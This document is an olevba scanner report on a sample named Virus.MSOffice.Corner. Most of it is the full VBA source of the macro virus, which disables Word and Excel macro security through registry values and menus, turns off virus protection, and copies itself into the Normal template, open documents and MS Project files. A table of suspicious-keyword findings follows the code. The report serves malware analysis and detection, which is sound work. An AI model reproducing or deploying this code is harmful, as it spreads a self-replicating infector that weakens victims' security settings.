olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Corner
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Corner - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'
On Error Resume Next
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = 1
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = (45 - 45)
End If
Options.SendMailAttach = True
Set Nrmal = NormalTemplate.VBProject.VBComponents(1).codemodule
Set aktiv = ActiveDocument.VBProject.VBComponents(1).codemodule
If Nrmal.Lines(2, 1) <> "'" Then
Nrmal.DeleteLines 1, Nrmal.CountOfLines
Nrmal.InsertLines 2, aktiv.Lines(2, aktiv.CountOfLines)
Nrmal.InsertLines 1, "Sub Document_Open()"
Nrmal.Replaceline 41, "Sub wrdcloser()"
End If
If aktiv.Lines(2, 1) <> "'" Then
aktiv.DeleteLines 1, aktiv.CountOfLines
aktiv.InsertLines 2, Nrmal.Lines(2, Nrmal.CountOfLines)
aktiv.InsertLines 1, "Sub Document_Close()"
aktiv.Replaceline 41, "Sub projcloser()"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Set projobj = GetObject(, "MSProject.Application")
If projobj = "" Then GoTo out
Set proj1obj = projobj.Projects.Add
proj1obj.VBProject.VBComponents.Item(1).codemodule.InsertLines 1, Nrmal.Lines(1, Nrmal.CountOfLines)
proj1obj.VBProject.VBComponents.Item(1).codemodule.Replaceline 41, "Private Sub Project_Deactivate(ByVal pj As MSProject.Project)"
Proj1.obj.Visible = False


out:
End Sub

Sub projcloser()
Application.MacroVirusProtection = False
Dim X As Project
For Each X In Projects
On Error Resume Next
Set ap = X.VBProject.VBComponents(1).codemodule
Set tp = ThisProject.VBProject.VBComponents(1).codemodule
If ap.Lines(2, 1) <> "'" Then
ap.DeleteLines 1, ap.CountOfLines
ap.InsertLines 1, tp.Lines(1, tp.CountOfLines)
Application.FileSaveAs Name:=ActiveProject.Name
End If
Next X
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
crossQuit = True
End If
Set Nrmal = WordObj.NormalTemplate.VBProject.VBComponents(1).codemodule
WordObj.Options.SaveNormalPrompt = False
Nrmal.DeleteLines 1, Nrmal.CountOfLines
Nrmal.InsertLines 1, tp.Lines(1, tp.CountOfLines)
Nrmal.Replaceline 1, "Sub Document_Open"
Nrmal.Replaceline 41, "Sub closer()"
Nrmal.Save
If crossQuit = True Then WordObj.Quit
'I never realized the lengths I'd have to go
'All the darkest corners of a sense
'I didn't know
'Just for one moment
'hearing someone call
'Looked beyond the day in hand
'There's nothing there at all
'Project98/Word97-2k Closer
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

